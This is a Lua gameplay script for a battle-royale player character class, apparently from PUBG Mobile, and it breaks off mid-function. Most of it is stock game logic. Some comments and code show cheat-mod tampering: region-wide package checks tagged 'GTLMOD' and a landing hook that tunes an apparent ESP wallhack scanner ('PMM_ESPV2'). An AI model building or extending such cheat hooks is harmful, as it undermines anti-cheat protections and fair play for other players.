local BRPlayerCharacterBase = {
  ServerRPC = {},
  ClientRPC = {},
  MulticastRPC = {},
  LuaEventContainer = {}
}
BRPlayerCharacterBase.ServerRPC.ServerRPC_NearDeathGiveupRescue = {
  Reliable = true,
  Params = {}
}
BRPlayerCharacterBase.ServerRPC.ServerRPC_CarryDeadBox = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Object
  }
}
BRPlayerCharacterBase.ServerRPC.RPC_Server_GmPlayAction = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
BRPlayerCharacterBase.MulticastRPC.MulticastRPC_GmPlayAction = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
BRPlayerCharacterBase.ClientRPC.RPC_Client_SetShouldCheckPassWall = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Bool
  }
}
local ENetRole = import("ENetRole")
local EPawnState = import("EPawnState")
local GameplayData = require("GameLua.GameCore.Data.GameplayData")
local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
local ESpecialMovementType = import("ESpecialMovementType")
local ESpiderSwingMoveState = import("ESpiderSwingMoveState")
local ESurviveWeaponPropSlot = import("ESurviveWeaponPropSlot")
local EParachuteState = import("EParachuteState")
local EMovementMode = import("EMovementMode")
local EStateType = import("EStateType")
local ESTEPoseState = import("ESTEPoseState")
local EGameModeType = import("EGameModeType")
local STExtraGameStateBase = import("STExtraGameStateBase")
local UKismetSystemLibrary = import("KismetSystemLibrary")
local USTExtraBlueprintFunctionLibrary = import("STExtraBlueprintFunctionLibrary")
local MatchModeIds = require("GameLua.Mod.BaseMod.GamePlay.Config.MatchModeIdsConfig")
local IngamePhoneStateUI = require("GameLua.Mod.Library.Client.UI.IngamePhoneStateUI")

local KismetSystemLibrary = import("KismetSystemLibrary")
local packageName = KismetSystemLibrary.GetGameBundleId()

-- ============================================
-- ALL VERSION SUPPORT (GL / KR / TW / VNG / BGMI)
-- Pehle sirf com.tencent.ig (GL) chalti thi, baaki par script return kar deti thi.
-- Ab har supported version par chalti hai. packageName se hi paths bante hain,
-- isliye alag-alag version ke liye alag file banane ki zaroorat nahi.
-- ============================================
local SUPPORTED_PACKAGES = {
    ["com.tencent.ig"]        = "GL",    -- Global
    ["com.pubg.krmobile"]     = "KR",    -- Korea
    ["com.rekoo.pubgm"]       = "TW",    -- Taiwan
    ["com.vng.pubgmobile"]    = "VNG",   -- Vietnam
    ["com.pubg.imobile"]      = "BGMI",  -- India
    ["com.tencent.tmgp.pubgmhd"] = "CN", -- China (Game For Peace)
}

_G.GTLMOD_PackageName = packageName
_G.GTLMOD_Version = SUPPORTED_PACKAGES[packageName] or "UNKNOWN"

-- Agar bundle id na mile to bhi band na karo -- sirf tab return karo jab
-- saaf pata ho ke yeh PUBG family ka app nahi hai.
if packageName and packageName ~= "" then
    if not SUPPORTED_PACKAGES[packageName] then
        -- Naya/unknown variant: agar naam mein pubg/tencent/ig ho to chalne do
        local pl = string.lower(packageName)
        if not (string.find(pl, "pubg", 1, true) or string.find(pl, "tencent", 1, true)
                or string.find(pl, "rekoo", 1, true) or string.find(pl, "vng", 1, true)) then
            return
        end
    end
end

-- ============================================
--- HELP TO FIXING SOME GLITCHES 
-- ============================================
function BRPlayerCharacterBase:ctor()
end

function BRPlayerCharacterBase:_PostConstruct()
  BRPlayerCharacterBase.__super._PostConstruct(self)
  self:InitAddSpecialMoveInfo()
  self.bCanNearDeathGiveup = true
  print(bWriteLog and "BRPlayerCharacterBase:_PostConstruct bCanNearDeathGiveup true")
end

function BRPlayerCharacterBase:ReceiveBeginPlay()
  BRPlayerCharacterBase.__super.ReceiveBeginPlay(self)
  self:AddControlEvent(self, "MovementModeChangedDelegate", self.HandleOnMovementModeChangedNew, self)
  if self:HasAuthority() and self:CheckAddCheckFallingDistanceComponent() then
    local CheckFallingDistanceComponent_C = import("CheckFallingDistanceComponent")
    if slua.isValid(CheckFallingDistanceComponent_C) and not slua.isValid(self:GetComponentByClass(CheckFallingDistanceComponent_C)) then
      print(bWriteLog and "BRPlayerCharacterBase:ReceiveBeginPlay Add CheckFallingDistanceComponent")
      Game:AddComponent(CheckFallingDistanceComponent_C, self, "CheckFallingDistanceComponent")
    end
  end
  if slua.isValid(self.STCharacterMovement) then
    self.STCharacterMovement.bPositiveBlowUp = true
  end
  if self.Role == ENetRole.ROLE_AutonomousProxy then
    self:AddControlEvent(self, "OnPawnStateDisabled", self.OnPawnStateChange, self)
    self:AddControlEvent(self, "OnPawnStateEnabled", self.OnPawnStateChange, self)
    self:AddControlEventConditionOnly(self, "OnAttrChangeEventDelegate", {
      AttrName = {
        "bCanSelfRescue"
      }
    }, self.CharacterAttrChangeEvent, self)
  end
  if Client then
    printf(bWriteLog and "BRPlayerCharacterBase:ReceiveBeginPlay, PlayerKey:%u ", self.PlayerKey)
    GameplayData.AddCharacter(self.Object)
  else
    self:AddCommonEventWithConditions(EVENTTYPE_INGAME_NORMAL, EVENTID_GAME_MODE_STATE_CHANGE, {
      [1] = "FinishedState"
    }, self.HandleFinishedState, self)
  end
end

function BRPlayerCharacterBase:HandleOnAttachedToVehicle(uVehicle)
  if not slua.isValid(uVehicle) then
    return
  end
  print(bWriteLog and string.format("BRPlayerCharacterBase:HandleOnAttachedToVehicle", Game:GetObjName(uVehicle)))
  if self.Role == ENetRole.ROLE_SimulatedProxy then
    self:ClearAttachToVehicleTimer()
    self.nUpdatePlayerAttachToVehicleCount = 0
    self.nUpdatePlayerAttachToVehicleTimer = self:AddGameTimer(5, true, 
function()
      if slua.isValid(self.Object) and slua.isValid(uVehicle) then
        self:UpdatePlayerAttachToVehicle(uVehicle)
      end
    end)
    self.nFixMeshContainerTimer = self:AddGameTimer(3, true, 
function()
      if slua.isValid(self.Object) and slua.isValid(uVehicle) then
        self:FixMeshContainerOffsetIfNeeded(uVehicle)
      end
    end)
  end
end

function BRPlayerCharacterBase:HandleOnDetachedFromVehicle(uLastVehicle)
  if not slua.isValid(uLastVehicle) then
    return
  end
  print(bWriteLog and "BRPlayerCharacterBase:HandleOnDetachedFromVehicle", uLastVehicle)
  if self.Role == ENetRole.ROLE_SimulatedProxy then
    self:ClearAttachToVehicleTimer()
    self.nUpdatePlayerAttachToVehicleCount = 0
  end
end

function BRPlayerCharacterBase:UpdatePlayerAttachToVehicle(uVehicle)
  if not slua.isValid(self.Object) or not slua.isValid(uVehicle) then
    return
  end
  if not slua.isValid(self.CapsuleComponent) or not slua.isValid(self.Mesh) or not slua.isValid(self.MeshContainer) then
    return
  end
  if not slua.isValid(self:GetCurrentVehicle()) then
    return
  end
  if Game:IsDriver(self.Object) then
    return
  end
  if not self.nUpdatePlayerAttachToVehicleCount then
    self.nUpdatePlayerAttachToVehicleCount = 0
  end
  local ESTEPoseState = import("ESTEPoseState")
  local bStand = self.PoseState == ESTEPoseState.Stand
  local uActorRelativeLocation = self.CapsuleComponent:GetRelativeTransform():GetLocation()
  local uMeshRelativeLocation = self.Mesh:GetRelativeTransform():GetLocation()
  local uMeshContainerRelativeLocationZ = self.MeshContainer:GetRelativeTransform():GetLocation().Z
  local nCapsuleRadius = self.CapsuleComponent:GetScaledCapsuleRadius()
  local nCapsuleHalfHeight = self.CapsuleComponent:GetScaledCapsuleHalfHeight()
  local uMeshContainerExpectedZ = -1 * self.StandHalfHeight
  local nExpectedCapsuleRadius = self.StandRadius
  local nExpectedCapsuleHalfHeight = self.StandHalfHeight
  local uMeshExpectedRL = FVector(0, 0, 0)
  local uActorExpectedRL = FVector(0, 0, self.StandHalfHeight)
  local nTolerance = 1.0
  local bCapsuleRLCorrect = uActorRelativeLocation:Equals(uActorExpectedRL, nTolerance)
  local bMeshRLCorrect = uMeshRelativeLocation:Equals(uMeshExpectedRL, nTolerance)
  local bMeshContainerRLCorrect = nTolerance > math.abs(uMeshContainerRelativeLocationZ - uMeshContainerExpectedZ)
  local bCapsuleRadiusCorrect = nTolerance > math.abs(nCapsuleRadius - nExpectedCapsuleRadius)
  local bCapsuleHalfHeightCorrect = nTolerance > math.abs(nCapsuleHalfHeight - nExpectedCapsuleHalfHeight)
  local bAllCorrect = bStand and bCapsuleRLCorrect and bMeshRLCorrect and bMeshContainerRLCorrect and bCapsuleRadiusCorrect and bCapsuleHalfHeightCorrect
  if not bAllCorrect then
    self.nUpdatePlayerAttachToVehicleCount = self.nUpdatePlayerAttachToVehicleCount + 1
  else
    self.nUpdatePlayerAttachToVehicleCount = 0
  end
  print(bWriteLog and string.format("BRPlayerCharacterBase:UpdatePlayerAttachToVehicle PlayerKey:%s. bAllCorrect=%s Check Result:%d %d %d %d %d %d, Count:%d", tostring(self.PlayerKey), tostring(bAllCorrect), bStand and 1 or 0, bCapsuleRLCorrect and 1 or 0, bMeshRLCorrect and 1 or 0, bMeshContainerRLCorrect and 1 or 0, bCapsuleRadiusCorrect and 1 or 0, bCapsuleHalfHeightCorrect and 1 or 0, self.nUpdatePlayerAttachToVehicleCount))
  if self.nUpdatePlayerAttachToVehicleCount >= 3 and not bAllCorrect then
    local GameplayData = require("GameLua.GameCore.Data.GameplayData")
    local uPlayerController = GameplayData.GetPlayerController()
    if uPlayerController.ReportCrashKitFeature and uPlayerController.ReportCrashKitFeature.ReportCharacterAttachedOnVehicleException then
      local sReportInfo = string.format("VehicleShapeType:%s PlayerKey:%s. Check Result:%d %d %d %d %d %d. Capsule.RelativeLoc:%s Capsule.Radius:%s Capsule.HalfHeight:%s Mesh.RelativeLoc:%s MeshContainer.RelativeLocZ:%s", tostring(uVehicle.VehicleShapeType), tostring(self.PlayerKey), bStand and 1 or 0, bCapsuleRLCorrect and 1 or 0, bMeshRLCorrect and 1 or 0, bMeshContainerRLCorrect and 1 or 0, bCapsuleRadiusCorrect and 1 or 0, bCapsuleHalfHeightCorrect and 1 or 0, uActorRelativeLocation:ToString(), tostring(nCapsuleRadius), tostring(nCapsuleHalfHeight), uMeshRelativeLocation:ToString(), tostring(uMeshContainerRelativeLocationZ))
      uPlayerController.ReportCrashKitFeature:ReportCharacterAttachedOnVehicleException(sReportInfo)
    end
    self.nUpdatePlayerAttachToVehicleCount = 0
  end
end

function BRPlayerCharacterBase:FixMeshContainerOffsetIfNeeded(uVehicle)
  if not slua.isValid(self.Object) or not slua.isValid(uVehicle) then
    return
  end
  if not slua.isValid(self.MeshContainer) then
    return
  end
  if not slua.isValid(self:GetCurrentVehicle()) then
    return
  end
  if Game:IsDriver(self.Object) then
    return
  end
  local nTolerance = 1.0
  local uMeshContainerExpectedZ = -1 * self.StandHalfHeight
  local uMeshContainerRelativeLocationZ = self.MeshContainer:GetRelativeTransform():GetLocation().Z
  if nTolerance <= math.abs(uMeshContainerRelativeLocationZ - uMeshContainerExpectedZ) then
    print(bWriteLog and string.format("BRPlayerCharacterBase:FixMeshContainerOffsetIfNeeded PlayerKey:%s. SetMeshContainerOffsetZ from:%s to:%s", tostring(uMeshContainerExpectedZ), tostring(uMeshContainerExpectedZ)))
    self:SetMeshContainerOffsetZ(uMeshContainerExpectedZ)
  end
end

function BRPlayerCharacterBase:ClearAttachToVehicleTimer()
  if self.nUpdatePlayerAttachToVehicleTimer then
    self:RemoveGameTimer(self.nUpdatePlayerAttachToVehicleTimer)
    self.nUpdatePlayerAttachToVehicleTimer = nil
  end
  if self.nFixMeshContainerTimer then
    self:RemoveGameTimer(self.nFixMeshContainerTimer)
    self.nFixMeshContainerTimer = nil
  end
end

function BRPlayerCharacterBase:CharacterAttrChangeEvent(uPawn, AttrName, AttrVal)
  BRPlayerCharacterBase.__super.CharacterAttrChangeEvent(self, uPawn, AttrName, AttrVal)
  if self.Object ~= uPawn then
    return
  end
  if self.Role == ENetRole.ROLE_AutonomousProxy and AttrName == "bCanSelfRescue" then
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:BroadcastUIMessage("UIMsg_CanSelfRescue", 0, "", "")
    end
  end
end

function BRPlayerCharacterBase:OnPawnStateChange(PawnState)
  print("BRPlayerCharacterBase:OnPawnStateChange:", PawnState)
  if PawnState == EPawnState.SwitchPP then
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:BroadcastUIMessage("UIMsg_FPPModeChange", 0, "", "")
    end
  end
end

function BRPlayerCharacterBase:HandleFinishedState()
  print(bWriteLog and "BRPlayerCharacterBase:HandleFinishedState", self.STCharacterMovement)
  if slua.isValid(self.STCharacterMovement) and self.STCharacterMovement.SetDynamicSimpleQueryConfigDisable then
    local EDynamicSimpleQueryConfigDisableMask = import("EDynamicSimpleQueryConfigDisableMask")
    self.STCharacterMovement:SetDynamicSimpleQueryConfigDisable(EDynamicSimpleQueryConfigDisableMask.Bit0, true)
  end
end

function BRPlayerCharacterBase:CheckAddCheckFallingDistanceComponent()
  if CGameMode and CGameMode.GameModeType and CGameState and CGameState.GameModeID then
    local GameModeType = CGameMode.GameModeType
    local GameModeID = tonumber(CGameState.GameModeID)
    local bModeTypeSatisfy = GameModeType == EGameModeType.ETypicalGameMode or GameModeType == EGameModeType.EFourInOneGameMode or GameModeType == EGameModeType.EHeavyWeaponGameMode
    local bModeIDSatisfy = not MatchModeIds[GameModeID]
    print(bWriteLog and bWriteLog and "BRPlayerCharacterBase:CheckAddCheckFallingDistanceComponent:", GameModeType, GameModeID, bModeTypeSatisfy, bModeIDSatisfy)
    return bModeTypeSatisfy and bModeIDSatisfy
  end
  return false
end

function BRPlayerCharacterBase:LuaHandleParachuteStateChanged(LastParachuteState, NewParachuteState)
  BRPlayerCharacterBase.__super.LuaHandleParachuteStateChanged(self, LastParachuteState, NewParachuteState)
  if not Client then
    local uCurrentPlayerControl = self:GetPlayerControllerSafety()
    if slua.isValid(uCurrentPlayerControl) and uCurrentPlayerControl.CheckParachuteOpenFeature then
      if NewParachuteState == EParachuteState.PS_Opening then
        if uCurrentPlayerControl.CheckParachuteOpenFeature.SatrtCheckShowParachuteCloseUI then
          uCurrentPlayerControl.CheckParachuteOpenFeature:SatrtCheckShowParachuteCloseUI()
        end
      elseif NewParachuteState == EParachuteState.PS_None then
        if uCurrentPlayerControl.CheckParachuteOpenFeature.RecoverParachuteOpenParam then
          uCurrentPlayerControl.CheckParachuteOpenFeature:RecoverParachuteOpenParam()
        end
        if uCurrentPlayerControl.CheckParachuteOpenFeature.ClearTimerAndState then
          uCurrentPlayerControl.CheckParachuteOpenFeature:ClearTimerAndState()
        end
      end
    end
  end
end

function BRPlayerCharacterBase:OnLanded()
  printf("BRPlayerCharacterBase:OnLanded PlayerKey:%d", self.PlayerKey)
  -- LAG FIX: Landing ke waqt bahut sare players hote hain (event zone 20-30 players)
  -- ESP scan interval temporarily badha do (3 seconds) taake landing smooth rahe
  -- phir apne aap normal ho jayega
  if _G.PMM_ESPV2 then
    _G.PMM_ESPV2.ScanInterval = 1.2   -- landing par scan slow (20-30 players = lag)
    -- 3 second baad normal restore
    pcall(function()
      local ticker = GetTicker and GetTicker()
      if ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(3.0, function()
          if _G.PMM_ESPV2 then _G.PMM_ESPV2.ScanInterval = 0.45 end
        end)
      end
    end)
  end
  if self.HandleOnLanded then
    self:HandleOnLanded(-1)
  end
  if not Client then
    local uCurrentPlayerControl = self:GetPlayerControllerSafety()
    if slua.isValid(uCurrentPlayerControl) and uCurrentPlayerControl.CheckParachuteOpenFeature then
      if uCurrentPlayerControl.CheckParachuteOpenFeature.ClearTimerAndState then
        uCurrentPlayerControl.CheckParachuteOpenFeature:ClearTimerAndState()
      end
      if uCurrentPlayerControl.CheckParachuteOpenFeature.ResetCheckShowUI then
        uCurrentPlayerControl.CheckParachuteOpenFeature:ResetCheckShowUI()
      end
    end
  end
end

function BRPlayerCharacterBase:ReceiveEndPlay(EndPlayReason)
  BRPlayerCharacterBase.__super.ReceiveEndPlay(self, EndPlayReason)
  if Client then
    GameplayData.RemoveCharacter(self.Object)
  end
end

function BRPlayerCharacterBase:IsWarGameMode()
  local uGameState = GameplayData:GetGameState()
  if slua.isValid(uGameState) and Game:IsClassOf(uGameState, STExtraGameStateBase) then
    return uGameState.GameModeType == EGameModeType.EWarGameMode
  else
    return false
  end
end

function BRPlayerCharacterBase:BPOnRecycled()
  print(bWriteLog and string.format("%s BPOnRecycled()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
  end
end

function BRPlayerCharacterBase:BPOnRespawned()
  print(bWriteLog and string.format("%s BPOnRespawned()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
  end
end

function BRPlayerCharacterBase:ReceiveOnRecycle()
  print(bWriteLog and string.format("%s IReusable:ReceiveOnRecycle()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
    GameplayData.RemoveCharacter(self.Object)
  end
end

function BRPlayerCharacterBase:ReceiveOnSpawn()
  print(bWriteLog and string.format("%s IReusable:ReceiveOnSpawn()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
    GameplayData.AddCharacter(self.Object)
  end
end

function BRPlayerCharacterBase:ResetMeshRelativeLocationAndRotation()
  if Game:IsValid(self.Object) and Game:IsValid(self.Mesh) then
    local uDefaultMeshRot = FRotator(0, -90, 0)
    local uDefaultMeshRelativeLoc = FVector(0, 0, 0)
    if self.Mesh.K2_SetRelativeRotation then
      self.Mesh:K2_SetRelativeRotation(uDefaultMeshRot, false, nil, false)
    end
    self:CacheInitialMeshOffset(uDefaultMeshRelativeLoc, uDefaultMeshRot)
    local vRelativeRot = self.Mesh.RelativeRotation
    local vBaseRotationOffset = self.BaseRotationOffset
    local vBaseRotation = Game:QuatToRotator(vBaseRotationOffset)
    print(bWriteLog and bWriteLog and string.format("%s ResetMeshRelativeLocationAndRotation() Mesh.RelativeRotation: %s %s %s   Pawn.BaseRotationOffset:%s %s %s ", Game:GetPlainName(self.Object), tostring(vRelativeRot.Pitch), tostring(vRelativeRot.Yaw), tostring(vRelativeRot.Roll), tostring(vBaseRotation.Pitch), tostring(vBaseRotation.Yaw), tostring(vBaseRotation.Roll)))
  end
end
-- ================== HANDLE MOVEMENT (NO WALL CLIMB) ==================
function BRPlayerCharacterBase:HandleOnMovementModeChangedNew()
  print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChanged11")
  if Game:IsValid(self.STCharacterMovement) and self.STCharacterMovement.MovementMode == EMovementMode.MOVE_Swimming and self:CheckBaseIsMoveable() then
    print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChanged22")
    self.CharacterMovement:SetBase(nil, "", true)
  end
  if self.Role == ENetRole.ROLE_AutonomousProxy and Game:IsValid(self.STCharacterMovement) and self.STCharacterMovement.MovementMode == EMovementMode.MOVE_Walking and UIManager.UI_Config_InGame.ParachuteOpenUI then
    print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChangedNew CloseUI")
    UIManager.CloseUI(UIManager.UI_Config_InGame.ParachuteOpenUI)
  end
end

function BRPlayerCharacterBase:BPOnMissPlayerDamageRecord()
end

BRPlayerCharacterBase.ClientRPC.ClientRPC_TriggerHighlightMoment = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.UInt32,
    UEnums.EPropertyClass.UInt32
  }
}

function BRPlayerCharacterBase:ClientRPC_TriggerHighlightMoment(Type, Param)
  print(bWriteLog and string.format("BRPlayerCharacterBase:ClientRPC_TriggerHighlightMoment Type = %d, Param = %s", Type, Param))
  EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_INGAME_TRIGGER_HIGHLIGHT_MOMENT, Type, Param)
end

function BRPlayerCharacterBase:PreAttachedToVehicle()
  local IsDS = UKismetSystemLibrary.IsDedicatedServer(self)
  if not IsDS then
    return
  end
  local MainPlayerController = self:GetPlayerControllerSafety()
  if not slua.isValid(MainPlayerController) then
    return
  end
  local CharacterAvatarComp2_BP = self.CharacterAvatarComp2_BP
  if not slua.isValid(CharacterAvatarComp2_BP) then
    return
  end
  local CommerAvatarDataUtil = require("GameLua.Activity.Commercialize.GamePlay.CommerAvatarDataUtil")
  local changedVehicleId = CommerAvatarDataUtil:ChangeVehicleSkinByClothes(MainPlayerController, CharacterAvatarComp2_BP)
  local ESTExtraVehicleShapeType = import("ESTExtraVehicleShapeType")
  if changedVehicleId then
    local UAvatarUtils = import("AvatarUtils")
    if UAvatarUtils.GetVehicleShapeBySkinID(changedVehicleId) == ESTExtraVehicleShapeType.VST_Horse then
      local uCurPlayerState = self:GetPlayerStateSafety()
      if slua.isValid(uCurPlayerState) then
        print(bWriteLog and "  BRPlayerCharacterBase:PreAttachedToVehicle. changedVehicleId: " .. tostring(changedVehicleId))
        uCurPlayerState:AddGeneralCount(468, 1, false)
      end
    end
  end
end

function BRPlayerCharacterBase:ParachuteJump()
  local uPlayerController = self:GetControllerSafety()
  if slua.isValid(uPlayerController) then
    if not self:GetEnsure() then
      if uPlayerController:GetCurrentStateType() ~= EStateType.State_ParachuteJump and uPlayerController:GetCurrentStateType() ~= EStateType.State_ParachuteOpen then
        self:SwitchPoseState(ESTEPoseState.Stand, true, true, true, false)
        uPlayerController:ReInitParachuteItem()
        uPlayerController:ServerChangeStatePC(EStateType.State_ParachuteJump)
      end
      print(bWriteLog and "BRPlayerCharacterBase:ParachuteJump over")
    else
      EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_AI_CALL_PARACHUTE_JUMP, self.Object)
      print(bWriteLog and "BRPlayerCharacterBase:ParachuteJump AI JUMP over, Loc=", tostring(self:K2_GetActorLocation():ToString()))
    end
  end
end

function BRPlayerCharacterBase:OnMovementBaseChangedEvent(uCharacter, uNewMovementBase, uOldMovementBase)
  if uCharacter ~= self.Object then
    return
  end
  print(bWriteLog and string.format("BRPlayerCharacterBase:OnMovementBaseChangedEvent %s, Base: %s -> %s", uCharacter, uOldMovementBase, uNewMovementBase))
  local MedievalCrane = self:GetMedievalCraneFromBase(uNewMovementBase)
  if MedievalCrane and MedievalCrane.AddCharacter then
    MedievalCrane:AddCharacter(self.Object)
  else
    MedievalCrane = self:GetMedievalCraneFromBase(uOldMovementBase)
    if MedievalCrane and MedievalCrane.RemoveCharacter then
      MedievalCrane:RemoveCharacter(self.Object)
    end
  end
end

function BRPlayerCharacterBase:GetMedievalCraneFromBase(Base)
  if not slua.isValid(Base) or not Base.GetOwner then
    return
  end
  local Lifter = Base:GetOwner()
  if not slua.isValid(Lifter) then
    return
  end
  if not Lifter.AddCharacter then
    return
  end
  return Lifter
end

function BRPlayerCharacterBase:CheckForbidFlaregun()
  local uPlayerState = self:GetPlayerStateSafety()
  if not slua.isValid(uPlayerState) then
    return false
  end
  if uPlayerState.CanUseFlaregun == false and self:IsLocallyControlled() then
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:DisplayGameTipWithMsgID(48532)
    end
  end
  return not uPlayerState.CanUseFlaregun
end

function BRPlayerCharacterBase:ServerRPC_NearDeathGiveupRescue()
  self:HandleNearDeathGiveupRescue()
end

function BRPlayerCharacterBase:HandleNearDeathGiveupRescue()
  local uNearDeathComp = self.NearDeatchComponent
  if self:IsNearDeath() and slua.isValid(uNearDeathComp) and self.bCanNearDeathGiveup == true then
    local uPlayerState = self:GetPlayerStateSafety()
    if slua.isValid(uPlayerState) then
      uPlayerState:AddGeneralCount(1613, 1, false)
    end
    uNearDeathComp:TriggerGotoDieExplictly(self.Object)
  end
end

function BRPlayerCharacterBase:RPC_Server_GmPlayAction(actionId)
  log(bWriteLog and "  BRPlayerCharacterBase:RPC_Server_GmPlayAction.  actionId: " .. tostring(actionId))
  if USTExtraBlueprintFunctionLibrary.IsDevelopment() then
    log(bWriteLog and "  BRPlayerCharacterBase:RPC_Server_GmPlayAction. IsDevelopment actionId: " .. tostring(actionId))
    self:MulticastRPC_GmPlayAction(actionId)
  end
end

function BRPlayerCharacterBase:MulticastRPC_GmPlayAction(actionId)
  if not Client then
    return
  end
  log(bWriteLog and "  BRPlayerCharacterBase:MulticastRPC_GmPlayAction.  actionId: " .. tostring(actionId))
  local uPlayEmoteComp = self:GetPlayEmoteComponent()
  if not slua.isValid(uPlayEmoteComp) then
    return
  end
  local LogFilter = require("common.log_filter")
  LogFilter.SetLogTreeEnable(true)
  local animCfg = CDataTable.GetTableData("EmoteBPTable", actionId)
  if not animCfg then
    return
  end
  local handlePath = animCfg.Path
  local EmoteHandleAsset = slua.loadObject(handlePath)
  local assetsArray = slua.Array(UEnums.EPropertyClass.Struct, import("/Script/CoreUObject.SoftObjectPath"))
  local handle = EmoteHandleAsset()
  uPlayEmoteComp:OnLoadEmoteAssetBegin(handle, actionId, assetsArray, "")
  log(bWriteLog and "  BRPlayerCharacterBase:MulticastRPC_GmPlayAction. assetsArray:Num(): " .. tostring(assetsArray:Num()))
  local tb = FuncUtil.LuaArrayToTable(assetsArray)
  local asset_util = require("common.asset_util")
  
  function loadLater()
    uPlayEmoteComp:OnLoadEmoteAssetEnd(handle, actionId, 0)
  end
  
  asset_util.GetAssetsArrayAsyncParallel(tb, loadLater)
end

function BRPlayerCharacterBase:RPC_Client_SetShouldCheckPassWall(bServerSyncShouldCheckPassWall)
  print(bWriteLog and "BRPlayerCharacterBase:RPC_Client_SetShouldCheckPassWall " .. tostring(bServerSyncShouldCheckPassWall))
  if slua.isValid(self.ParachuteComponent) then
    self.ParachuteComponent.bServerSyncShouldCheckPassWall = bServerSyncShouldCheckPassWall
  end
end

function BRPlayerCharacterBase:OnPlayerEnterCarryBoxState()
  self.Super:OnPlayerEnterCarryBoxState()
  local CharName = self:GetPlayerNameSafety()
  print(bWriteLog and string.format("DeadBoxLog BRPlayerCharacterBase:OnPlayerEnterCarryBoxState Role:%s PlayerKey:%s Name:%s", tostring(self.Role), tostring(self.PlayerKey), tostring(CharName)))
  if self.CarryDeadBoxFeature then
    self.CarryDeadBoxFeature:OnPlayerEnterCarryBoxState()
  end
end

function BRPlayerCharacterBase:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
  self.Super:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
  local CharName = self:GetPlayerNameSafety()
  print(bWriteLog and string.format("DeadBoxLog BRPlayerCharacterBase:OnPlayerLeaveCarryBoxState Role:%s PlayerKey:%s Name:%s bInIsInterrupt:%s", tostring(self.Role), tostring(self.PlayerKey), tostring(CharName), tostring(bInIsInterrupt)))
  if self.CarryDeadBoxFeature then
    self.CarryDeadBoxFeature:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
  end
end

function BRPlayerCharacterBase:ServerRPC_CarryDeadBox(uInDeadBox)
  if slua.isValid(uInDeadBox) and Game:IsClassOf(uInDeadBox, import("/Script/ShadowTrackerExtra.PlayerTombBox")) and self.CarryDeadBoxFeature then
    self.CarryDeadBoxFeature:CarryDeadBox(uInDeadBox)
  end
end

function BRPlayerCharacterBase:SetAreaID(AreaID)
  self:SetAttrValue("AreaID", AreaID, -1)
end

function BRPlayerCharacterBase:GetAreaID()
  return math.floor(self:GetAttrValue("AreaID") + 0.5)
end

function BRPlayerCharacterBase:CannotChangeIntoPetSpectator()
  print(bWriteLog and "BRPlayerCharacterBase:CannotChangeIntoPetSpectator")
  return self.bCannotChangeIntoPetSpectator
end

function BRPlayerCharacterBase:DoModChangeToBT()
  print(bWriteLog and string.format("BRPlayerCharacterBase:DoModChangeToBT, PlayerKey=%s", tostring(self.PlayerKey)))
  if self:HasState(EPawnState.SpecialSuit) then
    self:TriggerEntrySkillWithID(4301101, true)
    print(bWriteLog and string.format("BRPlayerCharacterBase:DoModChangeToBT, PlayerKey=%s, HasState(EPawnState.SpecialSuit)", tostring(self.PlayerKey)))
  end
end

function BRPlayerCharacterBase:SwitchCameraToParachuteOpening()
  print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteOpening")
  self.Super:SwitchCameraToParachuteOpening()
  if self.ParachuteFormation and self.ParachuteFormation.ShouldApplyFormationCamera and self.ParachuteFormation:ShouldApplyFormationCamera() then
    self.ParachuteFormation:OverlayFormationCameraParams()
    print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteOpening - Formation camera overlaid")
  end
end

function BRPlayerCharacterBase:SwitchCameraToParachuteFalling()
  print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteFalling")
  self.Super:SwitchCameraToParachuteFalling()
  if self.ParachuteFormation and self.ParachuteFormation.ShouldApplyFormationCamera and self.ParachuteFormation:ShouldApplyFormationCamera() then
    self.ParachuteFormation:OverlayFormationCameraParams()
    print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteFalling - Formation camera overlaid")
  end
end

function BRPlayerCharacterBase:SwitchCameraToNormal()
  print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToNormal")
  self.Super:SwitchCameraToNormal()
  if self.ParachuteFormation and self.ParachuteFormation.OnLandingClearFormationCamera then
    self.ParachuteFormation:OnLandingClearFormationCamera()
  end
end

function BRPlayerCharacterBase:SwitchWeaponCheck(Slot, IgnoreState)
  if self:HasState(EPawnState.AttachToOther) then
    local Weapon = self:GetWeaponBySlot(Slot)
    if slua.isValid(Weapon) then
      local WeaponID = Weapon:GetWeaponID()
      local AttachToOtherConfig = GamePlayTools.GetCurrentConfig("AttachToOtherConfig")
      if AttachToOtherConfig and AttachToOtherConfig.CheckIsWeaponInBlackList and AttachToOtherConfig.CheckIsWeaponInBlackList(WeaponID) then
        print(bWriteLog and "BRPlayerCharacterBase:SwitchWeaponCheck not allow switch weapon in AttachToOther, WeaponID: " .. tostring(WeaponID))
        local uPlayerController = self:GetPlayerControllerSafety()
